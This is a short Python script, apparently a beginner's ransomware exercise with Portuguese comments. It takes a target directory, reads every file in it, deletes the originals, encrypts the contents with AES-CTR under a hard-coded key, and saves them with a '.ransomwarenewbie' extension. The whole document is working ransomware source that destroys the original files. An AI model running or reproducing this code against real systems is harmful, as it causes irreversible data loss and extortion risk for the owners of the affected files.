import os
import pyaes

## abrir os arquivos a serem criptografados
target_directory = input("insert target directory\n")
archives_name = os.listdir(target_directory)
archives = [os.path.join(target_directory, archive) for archive in archives_name if os.path.isfile(os.path.join(target_directory, archive))]
files = [open(archive, "rb") for archive in archives]

print(archives)

files_data = [file.read() for file in files]
for file in files: file.close()

## remover o arquivo
for file in archives: os.remove(file)

## chave de criptografia
## criptografar o arquivo
key = b"testeransomwares"
list_of_crypto_data = []
for file_data in files_data:
    aes = pyaes.AESModeOfOperationCTR(key)
    list_of_crypto_data.append(aes.encrypt(file_data))

## salvar o arquivo criptografado
new_files = [file_name + ".ransomwarenewbie" for file_name in archives]
new_files = [open(f'{file}','wb') for file in new_files] 
for i,file in enumerate(new_files): 
	file.write(list_of_crypto_data[i])
for file in new_files: file.close()
